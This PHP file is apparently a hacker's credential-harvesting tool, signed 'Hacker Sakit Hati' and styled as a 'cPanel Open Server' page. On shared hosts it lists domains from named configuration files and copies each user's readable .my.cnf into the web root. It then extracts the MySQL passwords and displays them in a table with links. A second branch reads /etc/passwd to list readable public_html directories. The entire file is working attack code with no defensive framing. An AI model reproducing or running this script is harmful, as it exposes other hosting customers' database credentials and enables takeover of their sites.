 <?php
/**
					Hacked By Hacker Sakit Hati

		_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ _ ___ _  _ ____ ___ _ 
		|__| |__| |    |_/  |___ |__/ [__  |__| |_/  |  |  |__| |__|  |  | 
		|  | |  | |___ | \_ |___ |  \ ___] |  | | \_ |  |  |  | |  |  |  | 
                                                               			   

*/

@ini_set('display_errors',0);
function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
    $ar0=explode($marqueurDebutLien, $text);
    $ar1=explode($marqueurFinLien, $ar0[$i]);
    return trim($ar1[0]);
}

echo '<html><head>
<title>HsH Cpanel</title>
<meta content="text/html; charset=utf-8">
<style>
body,table{background:  ; font-family:Verdana,tahoma; color: lime ; font-size:10px }
A:link {text-decoration: none;color: darkviolet;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: aqua;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
</style>
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif"><center> 
</head><body>';
echo '<div style="font-family: Iceland;font-size: 35pt;text-shadow: 0 0 66px darkviolet, 0 0 5px darkviolet, 0 0 5px darkviolet;color: silver">..::[+  cPanel Open Server +]::.. <br /><sub>Hacker Sakit Hati</sub></div><br/>';


$d0mains = @file('/etc/named.conf');
$domains = scandir("/var/named");

if ($domains or $d0mains)
{
    $domains = scandir("/var/named");
    if($domains) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();

if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a href='http://".$domain.":/cpanel' target='_blank'>".$domain."</a></td><td>".$owner['name']."</td><td>".$password."</td><td><a href='".$owner['name'].".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$dc++;
}

}
}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align='center'><tr><th> No </th><th> Website </th><th> User </th><th> Password </th><th> Hasil </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td>".$count++."</td><td><a target='_blank' href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td>'.$r."</td><td>".$password."</td><td><a href='".$r.".txt' target='_blank'> Silahkan Dibuka </a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
				}
            }
			}
echo '</table>'; 
$total = $dc;
echo '<br><div class="result">Total cPanel Yang Ketemu = '.$total.'</h3><br />';
echo '</center>';

}
}else{
echo '<center>';
echo "<a href=\"https://www.facebook.com/Antonio.HsH\"><img class=\"logo\" src=\"https://3.bp.blogspot.com/-kqyfUPouqYk/VtYS0lU-ufI/AAAAAAAAADw/5707sF1NYwo/s1600/MemImg402.gif\" alt=\"Mionoon,..\"></a><br><br>\n";
echo "<div class='result'><i><font color='#FF0000'>Server ini Tidak Bisa</font><br><font color='#FF0000'>/var/named</font> or <font color='#FF0000'>etc/named.conf </font>Tidak Di temukan </i></div><br></center>";
}
	}
if ( isset($_GET['Nginceng']) )
{
set_time_limit(0);
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b>[+] ERROR | GA BISA BACA /etc/passwd [+]</b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
$str = fgets($passwd);
if ($i > 10)
{
$pos = strpos($str,':');
$username = substr($str,0,$pos);
$dirz = '/home/'.$username.'/public_html/';
if (($username != ''))
{
if (is_readable($dirz))
{
array_push($users,$username);
array_push($pub,$dirz);
}
}
}
$i++;
}
echo '<br><br>';
echo "<center><b>[+] Ngintip ".sizeof($pub)." Janda"." [+]</b><br/><br/>";
foreach ($users as $user)
{
$path = "/home/$user/public_html/";
echo "<a href='?y&#61;$path' target='_blank' style='font-weight:bold; color:#;'>$path</a><br>";
}
echo "<br>";
echo '</center></body></html>';

}
?>
